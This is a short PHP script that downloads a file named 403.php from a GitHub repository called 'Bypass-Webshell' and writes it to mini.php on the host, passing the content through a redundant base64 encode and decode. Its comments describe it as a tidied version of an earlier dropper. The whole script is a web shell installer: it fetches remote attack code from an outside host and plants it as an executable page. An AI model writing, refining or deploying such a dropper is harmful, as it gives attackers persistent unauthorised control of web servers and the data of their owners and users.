<?php
// Download 403.php from GitHub and write it to mini.php.
// The original version attempted to echo an undefined constant
// on failure which caused a PHP notice. It also used confusing
// variable names. This version clarifies the logic and properly
// prints an error message.

$remoteUrl      = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/403.php';
$remoteContent  = file_get_contents($remoteUrl);
$encodedContent = base64_encode($remoteContent);

if (file_put_contents('mini.php', base64_decode($encodedContent))) {
    echo "File : mini.php Success !";
} else {
    echo "Error";
}
?>
